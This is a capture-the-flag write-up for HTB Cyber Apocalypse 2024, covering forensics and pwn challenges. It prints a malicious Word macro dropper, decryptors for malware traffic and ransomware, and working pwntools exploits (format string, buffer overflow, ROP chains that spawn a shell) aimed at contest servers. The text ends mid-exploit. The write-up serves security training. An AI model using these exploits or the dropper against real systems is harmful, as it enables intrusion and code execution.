---
title: HTB CyberApocalypse 2024
date: '2024-03-08'
tags: ['All']
draft: false
summary: cyberapocalypse
---

# Digital Forensic Category

![ec865df8496e4561297558e8047e127f](https://hackmd.io/_uploads/H1HmMs0TT.png)

Player: k.eii
chall archive: https://github.com/jonscafe/cyberapocalypse2024/tree/main
(9/10 solved)

# 1. It Has Begun (_very easy_)

> given file script.sh, just read the script
> ![image](https://hackmd.io/_uploads/Sk3fNKCa6.png)
> tS_u0y_ll1w\{BTH >> HTB\{w1ll_y0u_St
> ![image](https://hackmd.io/_uploads/HywS4FAaT.png)
> NG5kX3kwdVJfR3IwdU5kISF9 >> 4nd_y0uR_Gr0uNd!!}

Flag: `HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}`

# 2. An unusual sighting (_very easy_)

> given file .zip and nc to answer questions
> try to open the chall file, got bash history and log file
>
> > questions:
> > What is the IP Address and Port of the SSH Server (IP:PORT) :
> > 100.107.36.130:2221 (_sshd.log_)
> >
> > > What time is the first successful Login:
> > > 2024-02-13 11:29:50 (_sshd.log_)
> > >
> > > What is the time of the unusual Login:
> > > 2024-02-19 04:00:14 (_sshd.log, search for the login anomaly location_)
> > >
> > > What is the Fingerprint of the attacker's public key:
> > > OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4 (_sshd.log, look for SHA fingerprint_)
> > >
> > > What is the first command the attacker executed after logging in:
> > > whoami (_bash_history.txt, look for command executed after the anomaly login_)
> > >
> > > What is the final command the attacker executed before logging out:
> > > ./setup (_bash_history.txt, look for command executed before anomaly user logged out_)

flag given by nc: `HTB{B3sT_0f_luck_1n_th3_Fr4y!!}`

# 3. Urgent (_very easy_)

> given .eml file, analyze it
> first, i will open it using notepad, when opening eml file as text, the content will be displayed as base64 so i check both the part and the important one lies on this content
> ![image](https://hackmd.io/_uploads/HJKMqgyRa.png)
>
> i decoded it and got this javascript
> ![image](https://hackmd.io/_uploads/S1zIDtA6T.png)
> on the eml, we got url encoded javascript, decode it! (i'll use cyberchef)
> ![image](https://hackmd.io/_uploads/HyZiwtC6a.png)
> after decoding it we got vbscript, and the flag is hardcoded

```
flag: `HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}`
```

# 4. Pursue the Tracks (_easy_)

> on this challenge, we also got the zip chall to be analyzed and nc to answer questions
> on the zip file, we've got z.mft
> .mft file (master file table) is a file that contains metadata of NTFS volume. we can analyze it using MFTECmd or MFTExplorer (https://ericzimmerman.github.io/#!index.md)
>
>     Files are related to two years, which are those? (for example: 1993,1995): 2023,2024
>
>     There are some documents, which is the name of the first file written? (for example: randomname.pdf): Final_Annual_Report.xlsx
>
>     Which file was deleted: Marketing_Plan.xlsx
>
>     How many of them is set to hidden mode: 1
>
>     filename of important txt file: credentials.txt
>
>     file that was copied: Financial_Statement_draft.xlsx
>
>     File modified: Project_Proposal.xlsx (there was many)
>
>     file located at record 45 (convert 45 to hex > 0x2D): Annual_Report.xlsx
>
>     file size located at record 40 (to hex > 0x28): 0xE000 = 57344
>
> ` Flag given by the nc: HTB{p4rs1ng_mft_1s_v3ry_1mp0rt4nt_s0m3t1m3s}`

# 5. Data Siege (_medium_)

> this is network traffic forensic. given capture.pcap as challenge file. read it using wireshark. the flag is splitted into 3 parts.
> ![image](https://hackmd.io/_uploads/SkJZ6YRTp.png)
> analyzing the capture, we come to conclusion that the user is trying to connect to a host with specific endpoint and downloaded some fishy executable from that site
> ![image](https://hackmd.io/_uploads/SJ-ITtR6a.png)
> assume that the executable is executed, the capture shows us that the computer make connection to some sketchy ip and port, if we follow it, we know that it was sending and receiving data from that ip
> ![image](https://hackmd.io/_uploads/By_56YAa6.png)
> on the bottom of the traffic data, we saw that the program executed powershell encoded command
> ![image](https://hackmd.io/_uploads/BJM6TKC6a.png)
> we gonna try to decode it as base64
> ![image](https://hackmd.io/_uploads/H1eyAKCpp.png)
> the result is:

```python
> action = New-ScheduledTaskAction -Execute "C:\Users\svc01\AppData\Roaming\4fva.exe"

$action = New-ScheduledTaskAction -Execute "C:\Users\svc01\AppData\Roaming\4fva.exe"

$trigger = New-ScheduledTaskTrigger -Daily -At 2:00AM

$settings = New-ScheduledTaskSettingsSet

# 3rd flag part:

Register-ScheduledTask -TaskName "0r3d_1n_7h3_h34dqu4r73r5}" -Action $action -Trigger $trigger -Settings $settings
```

> it contains the 3rd flag, i assume that the 2nd and 1st flag is on the same captured data. i try to decode it as base64 but didnt got anything so i assume it was encrypted that the encryption result is aes look alike.
> so i will analyze the executable malware.
> https://www.decompiler.com/jar/37f6dfe81be74027b3039e21612f3966/aQ4caZ.exe
> aes encrypted using:
> ![image](https://hackmd.io/_uploads/B108lcCTa.png)
> make the decryptor based on that encryption algorithm

```python
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
from Crypto import Random
import base64

def decrypt(cipher_text):
    try:
        encrypt_key = "VYAemVeO3zUDTL6N62kVA"
        array = base64.b64decode(cipher_text)

        salt = bytes([86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83])
        key = PBKDF2(encrypt_key, salt, 32)
        iv = PBKDF2(encrypt_key, salt, 16)

        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_text = cipher.decrypt(array)
        return decrypted_text
    except Exception as ex:
        print(ex)
        return "error"

cipher_text = "encrypted capture here"
print(decrypt(cipher_text))
```

> 2nd flag part: \_h45_b33n_r357
> 1st flag part: HTB\{c0mmun1c4710n5

`completed flag: HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}`

# 6. Phreaky _(medium)_

> we are given phreaky.pcap, again, analyze the network traffic
> when analyzing the traffic, i notice that the packet shows us that the computer is trying to download something from ubuntu server
> ![image](https://hackmd.io/_uploads/Hy4gGc0pp.png)
> but because i cant found out how to extract the downloaded file, i switch to another software (NetworkMiner)
> ![image](https://hackmd.io/_uploads/SJLHMqAa6.png)
> voila! got this many files.
> ![image](https://hackmd.io/_uploads/ryXOzqRap.png)
> notices it that the files is part files with different password and i try to extract it. when extracting the files, i try to open the part file and realize that the file contains PDF header
> ![image](https://hackmd.io/_uploads/Bk8RJy1C6.png)
>
> so i try to append it as pdf using this script:

```python
def unify_part_files(part_files, output_file):
    try:
        with open(output_file, 'wb') as output:
            for part_file in part_files:
                with open(part_file, 'rb') as input_file:
                    output.write(input_file.read())
        print("Part files unified successfully!")
    except Exception as e:
        print("Error:", e)

# List of part file names
part_files = ['phreaks_plan.pdf.part1', 'phreaks_plan.pdf.part2', 'phreaks_plan.pdf.part3', 'phreaks_plan.pdf.part4', 'phreaks_plan.pdf.part5', 'phreaks_plan.pdf.part6', 'phreaks_plan.pdf.part7', 'phreaks_plan.pdf.part8', 'phreaks_plan.pdf.part9', 'phreaks_plan.pdf.part10', 'phreaks_plan.pdf.part11', 'phreaks_plan.pdf.part12', 'phreaks_plan.pdf.part13', 'phreaks_plan.pdf.part14', 'phreaks_plan.pdf.part15']

# Output file name
output_file = 'phreaks_plan.pdf'

unify_part_files(part_files, output_file)
```

opening the pdf gave me the flag
`flag: HTB{Th3Phr3aksReadyT0Att4ck}`

# 7. Fake Boost _(easy)_

> ![image](https://hackmd.io/_uploads/Sy5jQqRaT.png)
> opening the given zip file, i got these 3 files. i try to open it using notepad and realize its just an obfuscated powershell script.
> ![image](https://hackmd.io/_uploads/HJVmV9ATT.png)
> i try to decode the strings using base64 but it didnt work so i try to analyze the script and notices that the string is being reversed
> ![image](https://hackmd.io/_uploads/r19IN9CT6.png)
> after reversing it, i decoded it as base64
> analyzing the result i notice it was encrypting data and the result is written in the another random string named file
> ![image](https://hackmd.io/_uploads/HJ1wKgyCp.png)

> ![image](https://hackmd.io/_uploads/SJDnEcRap.png)
> using the aes key written in the program i'll decode the encrypted string

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64

def decrypt_string(key, encrypted_text):
    key = base64.b64decode(key)
    encrypted_text = base64.b64decode(encrypted_text)

    iv = encrypted_text[:16]  # Extract IV from the encrypted text
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    decrypted_data = decryptor.update(encrypted_text[16:]) + decryptor.finalize()
    return decrypted_data.decode('utf-8')

AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
encrypted_data = "bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA=="

decrypted_data = decrypt_string(AES_KEY, encrypted_data)
print(decrypted_data)
```

> Result:

```basic
[

    {

        "ID":  "1212103240066535494",

        "Email":  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",

        "GlobalName":  "phreaks_admin",

        "Token":  "MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk"

    },

    {

        "ID":  "1212103240066535494",

        "Email":  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",

        "GlobalName":  "phreaks_admin",

        "Token":  "MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk"

    }
```

> the email is base64 encoded flag: b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
> it seems to be the 2nd part, and i notice that i miss this one
> ![image](https://hackmd.io/_uploads/BJ3LvcC6p.png)
> so the flag will be

`HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}`

# 8. Game Invitation _(hard)_

![image](https://hackmd.io/_uploads/rkxTD9RTa.png)

> hmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
> need to turn off the windef lol
> ![image](https://hackmd.io/_uploads/BJWWd9R66.png) > _noice_

> given .docm file, i directly know that we will be checking at the macro of this doc file
> extracted it using oletools, and got this vb

```basic
Public IAiiymixt As String
Public kWXlyKwVj As String


Function JFqcfEGnc(given_string() As Byte, length As Long) As Boolean
Dim xor_key As Byte
xor_key = 45
For i = 0 To length - 1
given_string(i) = given_string(i) Xor xor_key
xor_key = ((xor_key Xor 99) Xor (i Mod 254))
Next i
JFqcfEGnc = True
End Function

Sub AutoClose() 'delete the js script'
On Error Resume Next
Kill IAiiymixt
On Error Resume Next
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
aMUsvgOin.DeleteFile kWXlyKwVj & "\*.*", True
Set aMUsvgOin = Nothing
End Sub

Sub AutoOpen()
On Error GoTo MnOWqnnpKXfRO
Dim chkDomain As String
Dim strUserDomain As String
chkDomain = "GAMEMASTERS.local"
strUserDomain = Environ$("UserDomain")
If chkDomain <> strUserDomain Then

Else

Dim gIvqmZwiW
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
gIvqmZwiW = FreeFile
Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW
Dim CbkQJVeAG() As Byte
ReDim CbkQJVeAG(file_length)
Get #gIvqmZwiW, 1, CbkQJVeAG
Dim SwMbxtWpP As String
SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
Dim vTxAnSEFH
    Set vTxAnSEFH = CreateObject("vbscript.regexp")
    vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
Dim Y5t4Ul7o385qK4YDhr
If I4j833DS5SFd34L3gwYQD.Count = 0 Then
GoTo MnOWqnnpKXfRO
End If
For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
Exit For
Next
Dim Wk4o3X7x1134j() As Byte
Dim KDXl18qY4rcT As Long
KDXl18qY4rcT = 13082
ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
Get #gIvqmZwiW, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
If Not JFqcfEGnc(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
GoTo MnOWqnnpKXfRO
End If
kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
kWXlyKwVj = Environ("appdata")
End If
Set aMUsvgOin = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
Open (IAiiymixt) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End If
End Sub
```

> the vb will generate mailform.js and encrypt it. but because of me being suck at re and i dont know why my office word wont generate the mailform.js, my teammate FlaB helped me solve this chall
> after successfully generating the mailform.js (he said he used excel macro), we try to decrypt the js file

```csharp
Function xorring(given_string() As Byte, length As Long) As Boolean
    Dim xor_key As Byte
    xor_key = 45
    For i = 0 To length - 1
        given_string(i) = given_string(i) Xor xor_key
        xor_key = ((xor_key Xor 99) Xor (i Mod 254))
    Next i
    xorring = True
End Function

Sub Decryptor()
    ' Define the variables'
    Dim IOFile_input
    Dim IOFile_output
    Dim filename_input_length As Long
    Dim length As Long
    Dim file_input_content() As Byte
    Dim file_input_content_1 As String
    Dim mathced_AD, matched_file_input_content
    Dim regex_Obj
    Dim mathced_AD_FirstIndex
    Dim result() As Byte
    Dim result_size As Long
    Dim filename_input As String
    Dim filename_output As String

    filename_input = "invitation.docm"
    filename_output = "mailform.js"

    result_size = 13082
    ReDim result(result_size) 'set size'

    filename_input_length = FileLen(filename_input)
    IOFile_input = FreeFile
    Open (filename_input) For Binary As #IOFile_input
    ReDim file_input_content(filename_input_length) 'set size', likely get all the content of the file'
    Get #IOFile_input, 1, file_input_content
    file_input_content_1 = StrConv(file_input_content, vbUnicode)

    ' searching last index of matched string pattern in the file content and get the first index of the matched string pattern in the file content'
    Set regex_Obj = CreateObject("vbscript.regexp")
    regex_Obj.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set matched_file_input_content = regex_Obj.Execute(file_input_content_1)
    If matched_file_input_content.Count = 0 Then
        GoTo exit_label
    End If
    ' this the searcher last index of matched string pattern in the file content and get the first index of the matched string pattern in the file content'
    For Each mathced_AD In matched_file_input_content
        mathced_AD_FirstIndex = mathced_AD.FirstIndex
    Exit For
    Next

    ' get the content of the file from the first index of the matched string pattern in the file content to the end of the file content'
    Get #IOFile_input, mathced_AD_FirstIndex + 81, result
    If Not xorring(result(), result_size + 1) Then
        GoTo exit_label
    End If

    ' write the content of the file to the mailform.js file'
    Dim ExcelApp As Object
    Set ExcelApp = CreateObject("Excel.Application")
    ExcelApp.Visible = True
    ExcelApp.Workbooks.Add
    ExcelApp.Cells(1, 1).Value = StrConv(result, vbUnicode)


    Exit Sub 'exit the sub, this is like a return statement'

exit_label:
    Close #IOFile_output
    ActiveDocument.Save
End Sub
```

`flag: HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}`

# 9. Confinement _(hard)_

> lol, i love this chall, its pretty cool
> given Confinement.ad1 file, try to analyze it using FTKImager and ArtiFast
> the chall description says that we need to recover some specific document located at \Documents\Work
> the document is encrypted by some ransomware created by HTB so we cant find some public decryption tools.
>
> using PECmd, im parsing all of the prefetch files (prefetch file is something that generated when you executed a program)
>
> ![image](https://hackmd.io/_uploads/HkzDiqCap.png)
> from the result of prefetch analyze, i notices that the ransomware is INTEL.exe because it loaded all of the encrypted documents

> i mount the .ad1 file using FTKImager and try to find the executable, but, man, i can't find it anywhere.
>
> i come to an idea to check all of the Windows Event Log (evtx files) to check what just happend on the PC.
>
> So i used EvtxCmd (Eric Zimmerman Tools) to dump all of the evtx file as csv.
> Using timeline explorer (Eric Zimmerman Tools) i found out it was quarantined by Windows Defender (lol)
> ![image](https://hackmd.io/_uploads/r17S35RTT.png)
> i check out the WinDef Directory in ProgramData/Microsoft/WindowsDefender/Quarantine/ResourceData, and found the malware artifact
> ![image](https://hackmd.io/_uploads/Skdjn9Cpp.png)

> but it was encrypted by Windows Defender.
> https://blog.fox-it.com/2023/12/14/reverse-reveal-recover-windows-defender-quarantine-forensics/

> from the documentation above, we know it was encrypted using RC4 and the key is hardcoded in mpengine.dll
> https://github.com/brad-sp/cuckoo-modified/commit/61087cae2e40c8b26f94162c652b4bc48256264b

> and walaaa, we can recover the malware sample.
> after that, we will analyze the malware and how the encryption proccess works so we can make the decryptor

> https://www.decompiler.com/jar/2f3b011d0fdd4023b87eb2aa02324cb1/test.exe
> decompiled using decompiler.com
> ![image](https://hackmd.io/_uploads/ry9V0cCp6.png)
>
> the password is generated using this function, taking salt from Program.cs
> ![image](https://hackmd.io/_uploads/HkkDA5CpT.png)
>
> used salt taken from:
> ![image](https://hackmd.io/_uploads/rk9qri0pp.png)

> the file encrypt using AES and different key for each unique ID, the salt is hardcoded so we can try to create the key generator for each UIDs and make decyptor from that

> key/password generator for UIDs:

```python
import hashlib
import base64
import uuid

class PasswordHasher:
    def get_salt(self):
        return str(uuid.uuid4()).replace('-', '')

    def hasher(self, password):
        hashed = hashlib.sha512(password.encode()).digest()
        return base64.b64encode(hashed).decode()

    def get_hash_code(self, password, salt):
        password_with_salt = password + salt
        return self.hasher(password_with_salt)

    def check_password(self, password, salt, hashedpass):
        return self.get_hash_code(password, salt) == hashedpass

def main():
    salt = "0f5264038205edfb1ac05fbb0e8c5e94"
    password_hasher = PasswordHasher()
    uid = "5K7X7E6X7V2D6F"
    hashed_password = password_hasher.get_hash_code(uid, salt)
    print("Hashed password:", hashed_password)

if __name__ == "__main__":
    main()

```

> the UID used is at the ultimatum.hta file:
>
> <div class='footer'>Faction ID = <span>5K7X7E6X7V2D6F</span></div>
> the password/key would be: A/b2e5CdOYWbfxqJxQ/Y4Xl4yj5gYqDoN0JQBIWAq5tCRPLlprP2GC87OXq92v1KhCIBTMLMKcfCuWo+kJdnPA==

> decryptor:

```csharp
using System;
using System.IO;
using System.Security.Cryptography;

public class Program
{
    public static void Decrypt(string encryptedFile, string decryptedFile, string password)
    {
        byte[] array = new byte[65535];
        byte[] salt = new byte[8] { 0, 1, 1, 0, 1, 1, 0, 0 };
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt, 4953);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        rijndaelManaged.Padding = PaddingMode.ISO10126;
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);

        FileStream encryptedFileStream = null;
        FileStream decryptedFileStream = null;
        CryptoStream cryptoStream = null;

        try
        {
            encryptedFileStream = new FileStream(encryptedFile, FileMode.Open, FileAccess.Read);
            decryptedFileStream = new FileStream(decryptedFile, FileMode.Create, FileAccess.Write);
            cryptoStream = new CryptoStream(encryptedFileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);

            int bytesRead;
            do
            {
                bytesRead = cryptoStream.Read(array, 0, array.Length);
                if (bytesRead > 0)
                {
                    decryptedFileStream.Write(array, 0, bytesRead);
                }
            } while (bytesRead > 0);

            cryptoStream.Close();
            encryptedFileStream.Close();
            decryptedFileStream.Close();
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(ex.Message);
            Console.ForegroundColor = ConsoleColor.Red;
        }
    }

    public static void Main(string[] args)
    {
        string encryptedFile = "Applicants_info.xlsx.korp";
        string decryptedFile = "Applicants_info.xlsx";
        string password = "A/b2e5CdOYWbfxqJxQ/Y4Xl4yj5gYqDoN0JQBIWAq5tCRPLlprP2GC87OXq92v1KhCIBTMLMKcfCuWo+kJdnPA=="; // Replace with your actual password
        Decrypt(encryptedFile, decryptedFile, password);
    }
}

flag: `HTB{2_f34r_1s_4_ch01ce_322720914448bf9831435690c5835634}`
```

# Pwn Category

![itoid the warrior 8](https://hackmd.io/_uploads/HJ32tQJAa.png)

Players: itoid & zran
(9/10 solved)

# 1. Tutorial (_very easy_)

> Given questions about integer overflows, we just need to answer them accordingly

```python
from pwn import *
exe = './test'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.58.224 52022".split(" ")[1:3]
io = remote(host, port)
io.sendlineafter(b'>> ', b'y')
io.sendlineafter(b'>> ', b'2147483647')
io.sendlineafter(b'>> ', b'-2147483648')
io.sendlineafter(b'>> ', b'-2')
io.sendlineafter(b'>> ', b'integer overflow')
io.sendlineafter(b'>> ', b'-2147483648')
io.sendlineafter(b'>> ', b'1337')
io.interactive()
# flag = HTB{gg_3z_th4nk5_f0r_th3_tut0r14l}
```

![image](https://hackmd.io/_uploads/HyFlqGJRT.png)

# 2. Delulu (_very easy_)

> There is a format string vulnerability in printf((const char \*)buf). We just need to overwrite v4[0] from 0x1337BABE to 0x1337BEEF by performing a two-byte overwrite. This will allow us to call the delulu() function and obtain the flag
>
> ![image](https://hackmd.io/_uploads/H1l6JdbA6.png)

![image](https://hackmd.io/_uploads/HJZyhmJRa.png)

```python
from pwn import *
exe = './delulu'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.56.26 52359".split(" ")[1:3]
io = remote(host, port)
io.sendline('%{}x%7$hn'.format(str(0x1337BEEF & 0xFFFF)).encode())
io.interactive()
# flag = HTB{m45t3r_0f_d3c3pt10n}
```

![image](https://hackmd.io/_uploads/HJG-nG1AT.png)

# 3. Writing on the Wall (_very easy_)

> There is a one-byte overflow vulnerability on read(0, buf, 7uLL), and we can bypass strcmp(buf, s2) with a null byte because the strcmp() function stops at a null byte. Hence, by sending 7 null bytes, we can cause strcmp() to evaluate as true and call the open_door() function, which displays the flag on the screen
>
> ![image](https://hackmd.io/_uploads/rkkIhmyC6.png)

![image](https://hackmd.io/_uploads/Bkyw3XkCT.png)

```python
from pwn import *
exe = './writing_on_the_wall'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.62.241 38688".split(" ")[1:3]
io = remote(host, port)
io.sendline(b'\0' * 0x7)
io.interactive()
# flag = HTB{3v3ryth1ng_15_r34d4bl3}
```

![image](https://hackmd.io/_uploads/Hkhppf1RT.png)

# 4. Pet Companion (_easy_)

> There is a buffer overflow vulnerability on read(0, buf, 256uLL)
>
> ![image](https://hackmd.io/_uploads/Skuypm1Ap.png)

> I used ret2csu to leak the libc's write address. Then, I constructed a ROP chain to achieve arbitrary code execution
>
> ![image](https://hackmd.io/_uploads/H1GuVdW06.png)

```python
from pwn import *
exe = './pet_companion'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 83.136.254.16 55249".split(" ")[1:3]
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()
libc = ELF("./glibc/libc.so.6", checksec = 0)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec = 0)

p = cyclic(0x48)
p += p64(0x40073a)
p += p64(0x0)
p += p64(0x1)
p += p64(0x600fd8)
p += p64(0x1)
p += p64(0x600fd8)
p += p64(0x6)
p += p64(0x400720)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x40064a)
sla(b'current status: ', p)
rud(b'...\n')
rl()
leaked = u64(lj(rud(b'\n'), 8, b'\0'))
assert leaked & 0xfff == 0x0f0
li(f"Leaked: {hex(leaked)}")
libc.address = leaked - 0x1100f0
li(f"Libc address: {hex(libc.address)}")
assert libc.address & 0xfff == 0
p = flat(cyclic(0x48), libc.address + 0x4f2a5) # execve("/bin/sh", rsp+0x40, environ)
sl(p)
com()
# flag = HTB{c0nf1gur3_w3r_d0g}
```

![image](https://hackmd.io/_uploads/Bk2xJ71Cp.png)

# 5. Rocket Blaster XXX (_easy_)

> There is a buffer overflow vulnerability in read(0, buf, 0x66uLL). Additionally, there is a function named fill_ammo() that displays the flag on the screen if the Destination Index Register, Source Index Register, and Data Register meet the requirements based on the code when we call the fill_ammo() function. Therefore, we just need to create a ROP chain to exploit this vulnerability
>
> ![image](https://hackmd.io/_uploads/SJwU6myCT.png)

![image](https://hackmd.io/_uploads/r1HBBObAp.png)

```python
from pwn import *
exe = './rocket_blaster_xxx'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.51.96 42628".split(" ")[1:3]
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()

p = cyclic(0x28)
p += p64(0x000000000040101a)
p += p64(0x000000000040159f)
p += p64(0xDEADBEEF)
p += p64(0x000000000040159d)
p += p64(0xDEADBABE)
p += p64(0x000000000040159b)
p += p64(0xDEAD1337)
p += p64(0x00000000004012f5)
sla(b'>> ', p)
com()
# flag = HTB{b00m_b00m_r0ck3t_2_th3_m00n}
```

![image](https://hackmd.io/_uploads/rkse-m1A6.png)

# 6. Sound of Silence (_medium_)

> There is a buffer overflow vulnerability upon calling the function gets(v4, argv)
>
> ![image](https://hackmd.io/_uploads/Skdp6XkCa.png)
> The Executable and Linkable Format (ELF) also has the system function in its Procedure Linkage Table. Based on my observation, our input will be stored in the Accumulator Register. Therefore, I input the string "/bin/sh\0" and then use the instruction mov rdi, rax, so it calls system("/bin/sh"), allowing us to achieve arbitrary code execution
>
> ![image](https://hackmd.io/_uploads/HyjT8uW0a.png)

```python
from pwn import *
exe = './sound_of_silence'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.62.149 33617".split(" ")[1:3]
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
